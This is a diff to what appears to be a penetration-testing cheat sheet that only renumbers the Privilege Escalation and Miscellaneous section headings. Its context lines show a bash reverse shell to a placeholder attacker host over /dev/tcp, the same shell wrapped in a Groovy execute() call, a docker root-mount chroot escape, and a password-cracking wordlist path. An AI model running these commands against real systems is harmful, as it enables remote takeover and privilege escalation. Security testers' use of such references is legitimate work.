@@ -410,7 +410,7 @@ bash -i >& /dev/tcp/<attacker_ip>/9001 0>&1
 ["/bin/bash", "-c", "bash -i >& /dev/tcp/<attacker_ip>/9001 0>&1"].execute()
 ```
 
-# Section 5. Privilege Escalation
+# Section 6. Privilege Escalation
 ## Windows Privilege Escalation
 - ACL Abuse Chain with BloodHound
 ```
@@ -466,7 +466,7 @@ or
 docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
 ```
 
-# Section 6. Miscellaneous
+# Section 7. Miscellaneous
 ### Wordlists
 ```
 /usr/share/wordlists/rockyou.txt                                  # Password Cracking Wordlist
